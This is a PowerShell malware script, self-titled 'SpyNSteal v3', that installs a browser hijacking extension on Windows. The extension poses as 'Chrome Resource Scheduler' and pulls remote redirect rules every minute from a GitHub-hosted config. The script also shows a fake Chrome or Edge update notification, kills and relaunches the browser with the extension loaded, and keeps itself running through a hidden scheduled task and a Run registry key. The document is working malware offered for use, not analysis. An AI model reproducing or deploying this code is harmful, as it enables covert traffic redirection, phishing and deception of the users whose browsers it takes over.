# SpyNSteal v3 - Scheduled task persistence (ChromeLoader method)
# Drops extension, creates persistent monitor, relaunches with --load-extension

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://raw.githubusercontent.com/Intel-Boss/t/main/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) {
    $ts = Get-Date -Format 'HH:mm:ss'
    try { Add-Content $LOG "$ts  $msg" } catch {}
}

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $exe = if ($name -eq "chrome") { "chrome.exe" } else { "msedge.exe" }
            $c = Join-Path $d $exe
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-Browser([string]$procName) {
    for ($i = 0; $i -lt 20; $i++) {
        if (-not (Get-Process $procName -EA SilentlyContinue)) { return $true }
        Get-Process $procName -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

# =============================================================================
Log "=== SpyNSteal v3 ==="

# -- Drop extension files --
$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
$utf8 = New-Object Text.UTF8Encoding($false)
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, $utf8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, $utf8)
Log "Extension dropped: $extDir"

# -- Find browsers --
$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "$name : Found=$($b.Found) Running=$($b.Running)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "No browsers found"; exit }

# -- Fake update notification if running --
$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }

# -- Kill browsers --
foreach ($b in $browsers) {
    if ($b.Running) {
        Kill-Browser $b.Proc | Out-Null
        Log "$($b.Proc) killed"
    }
}
Start-Sleep 2

# -- Select target browser --
$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }

# -- Build launch arguments --
$launchArgs = @(
    "--load-extension=`"$extDir`"",
    "--disable-features=DisableLoadExtensionCommandLineSwitch",
    "--restore-last-session"
)
$launchArgsStr = $launchArgs -join ' '

# -- Create monitor script (ensures extension stays loaded) --
$monitorScript = @"
`$extDir = '$($extDir.Replace("'","''"))'
`$chromeExe = '$($target.ExePath.Replace("'","''"))'
`$procName = '$($target.Proc)'
`$log = '$($LOG.Replace("'","''"))'

function L([string]`$m) { try { Add-Content `$log "`$(Get-Date -Format 'HH:mm:ss') [mon] `$m" } catch {} }

if (-not (Test-Path `$extDir)) { exit }

`$procs = Get-CimInstance Win32_Process -Filter "name='`$(`$procName).exe'" -EA SilentlyContinue
if (-not `$procs) { exit }

`$hasExt = `$false
foreach (`$p in `$procs) {
    if (`$p.CommandLine -and `$p.CommandLine -like '*load-extension*') {
        `$hasExt = `$true
        break
    }
}

if (-not `$hasExt) {
    L 'Chrome running without extension - restarting'
    Get-Process `$procName -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 3
    Start-Process -FilePath `$chromeExe -ArgumentList "--load-extension=`"`$extDir`"","--disable-features=DisableLoadExtensionCommandLineSwitch","--restore-last-session"
    L 'Relaunched with extension'
}
"@
$monitorPath = Join-Path $baseDir "monitor.ps1"
[IO.File]::WriteAllText($monitorPath, $monitorScript, $utf8)
Log "Monitor script: $monitorPath"

# -- Create scheduled task for persistence --
$taskName = "ChromeServiceCheck"
$psExe = Join-Path $env:WINDIR "System32\WindowsPowerShell\v1.0\powershell.exe"
$taskAction = New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$monitorPath`""

$taskTriggers = @(
    $(New-ScheduledTaskTrigger -AtLogOn),
    $(New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5))
)

$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
$taskPrincipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U -RunLevel Limited

try {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -EA SilentlyContinue
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTriggers -Settings $taskSettings -Principal $taskPrincipal -Force | Out-Null
    Log "Scheduled task created: $taskName (every 5 min + logon)"
} catch {
    Log "Scheduled task failed: $_ - falling back to Run key only"
}

# -- Set Run key (backup persistence for login) --
$runCmd = "`"$($target.ExePath)`" $launchArgsStr"
try {
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ChromeBrowserAutoLaunch" /t REG_SZ /d "$runCmd" /f 2>&1 | Out-Null
    Log "Run key set: ChromeBrowserAutoLaunch"
} catch {
    Log "Run key failed: $_"
}

# -- Launch browser with extension now --
Start-Process -FilePath $target.ExePath -ArgumentList $launchArgs
Log "Launched $($target.Name) with extension"
Start-Sleep 3
Log "=== Done ==="
